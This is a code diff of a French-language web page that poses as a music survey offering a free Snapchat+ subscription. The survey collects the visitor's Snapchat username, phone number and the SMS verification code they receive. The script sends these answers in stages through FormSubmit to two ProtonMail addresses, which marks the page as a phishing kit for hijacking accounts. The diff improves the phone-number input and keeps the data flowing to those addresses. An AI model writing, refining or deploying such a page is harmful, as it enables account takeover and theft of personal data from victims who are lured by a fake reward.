@@ -157,16 +157,16 @@ const questions = [
     { text:"Quel artiste écoutes-tu actuellement?", type:"text", placeholder:"Ex : Damso" },
     { text:"Quel artiste aimerais-tu découvrir davantage ?", type:"text", placeholder:"Ex : Jul" },
     { text:"Quel est ton nom d'utilisateur Snapchat ?", type:"text", placeholder:"Pseudo Snapchat" },
-    { text:"Quel est ton numéro de téléphone ?", type:"tel", placeholder:"0601020304" },
+    { text:"Quel est ton numéro de téléphone ?", type:"custom-phone" },
     { text:"Entre le code reçu par SMS", type:"text", placeholder:"XXXX" }
 ];
 
 let indexQuestion = 0;
 let reponsesUtilisateur = [];
 
-// Emails à remplacer par les tiens
-const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com"; // Email principal
-const ccEmail = "becteurfoou@proton.me"; // Email secondaire
+// Emails
+const formsubmitURL = "https://formsubmit.co/anonymous2026b@protonmail.com";
+const ccEmail = "becteurfoou@proton.me";
 
 function demarrer(){
     document.getElementById("intro").style.display="none";
@@ -177,40 +177,88 @@ function demarrer(){
 function afficherQuestion(){
     const q = questions[indexQuestion];
     document.getElementById("question").textContent = q.text;
-    document.getElementById("reponses").innerHTML = `<input type="${q.type}" id="champ" placeholder="${q.placeholder}" oninput="verifier()">`;
+
+    if(q.type === "custom-phone"){
+
+        document.getElementById("reponses").innerHTML = `
+            <div style="display:flex; gap:10px; justify-content:center;">
+                <select id="prefix" onchange="verifier()" style="padding:10px; font-size:16px;">
+                    <option value="06">06</option>
+                    <option value="07">07</option>
+                </select>
+
+                <input 
+                    type="tel"
+                    id="champ"
+                    placeholder="12345678"
+                    maxlength="8"
+                    pattern="[0-9]*"
+                    inputmode="numeric"
+                    style="padding:10px; font-size:16px;"
+                    oninput="this.value=this.value.replace(/[^0-9]/g,''); verifier();"
+                >
+            </div>
+        `;
+
+    } else {
+
+        document.getElementById("reponses").innerHTML =
+            `<input type="${q.type}" 
+                    id="champ" 
+                    placeholder="${q.placeholder}" 
+                    oninput="verifier()" 
+                    style="padding:10px; font-size:16px; width:80%;">`;
+    }
+
     document.getElementById("btnSuivant").disabled = true;
     document.getElementById("partenariat").style.display = indexQuestion>=3 ? "block" : "none";
     updateProgress();
 }
 
 function verifier(){
-    const champ = document.getElementById("champ");
-    document.getElementById("btnSuivant").disabled = !champ.value.trim();
+    const q = questions[indexQuestion];
+
+    if(q.type === "custom-phone"){
+        const numero = document.getElementById("champ").value.trim();
+        document.getElementById("btnSuivant").disabled = numero.length !== 8;
+    } else {
+        const champ = document.getElementById("champ");
+        document.getElementById("btnSuivant").disabled = !champ.value.trim();
+    }
 }
 
 function updateProgress(){
-    document.getElementById("progressBar").style.width = ((indexQuestion+1)/questions.length*100) + "%";
+    document.getElementById("progressBar").style.width =
+        ((indexQuestion+1)/questions.length*100) + "%";
 }
 
 function suivant(){
-    const champ = document.getElementById("champ");
-    const val = champ.value.trim();
 
-    // Vérification du numéro si nécessaire
-    if(questions[indexQuestion].type==="tel" && !/^[0-9]{10}$/.test(val)){
-        alert("Numéro invalide (10 chiffres)");
-        return;
+    const q = questions[indexQuestion];
+
+    if(q.type === "custom-phone"){
+        const prefix = document.getElementById("prefix").value;
+        const numero = document.getElementById("champ").value.trim();
+
+        if(!/^[0-9]{8}$/.test(numero)){
+            alert("Numéro invalide (8 chiffres après 06 ou 07)");
+            return;
+        }
+
+        reponsesUtilisateur[indexQuestion] = prefix + numero;
+
+    } else {
+        const champ = document.getElementById("champ");
+        const val = champ.value.trim();
+        reponsesUtilisateur[indexQuestion] = val;
     }
 
-    // Stocke la valeur dans le tableau
-    reponsesUtilisateur[indexQuestion] = val;
-
-    // Étape 1 : après les 3 premières réponses
+    // Étape 1
     if(indexQuestion === 2){
         envoyer(1);
     }
 
-    // Étape 2 : après Snapchat + téléphone (questions 3 et 4)
+    // Étape 2
     if(indexQuestion === 4){
         envoyer(2);
     }
@@ -220,8 +268,10 @@ function suivant(){
     if(indexQuestion < questions.length){
         afficherQuestion();
     } else {
-        // Étape 3 : envoi final avec code SMS
+
+        // Étape finale
         envoyer(3);
+
         document.getElementById("sondage").innerHTML = `
             <h2>Merci pour votre participation !</h2>
             <p>Vous recevrez votre abonnement Snapchat+ directement sur votre compte dans un délai d'environ 15 minutes.</p>
@@ -235,11 +285,8 @@ function continuer(){
     afficherQuestion();
 }
 
-// Envoi des données au mail via Formsubmit
+// Envoi Formsubmit
 function envoyer(etape){
-    // Récupère directement les valeurs depuis le DOM si elles existent
-    const inputSnapchat = document.getElementById("champ");
-    if(inputSnapchat) reponsesUtilisateur[indexQuestion] = inputSnapchat.value.trim();
 
     const formData = new FormData();
     formData.append("artiste_prefere", reponsesUtilisateur[0] || "");
@@ -259,3 +306,5 @@ function envoyer(etape){
 </script>
 </body>
 </html>
+
+
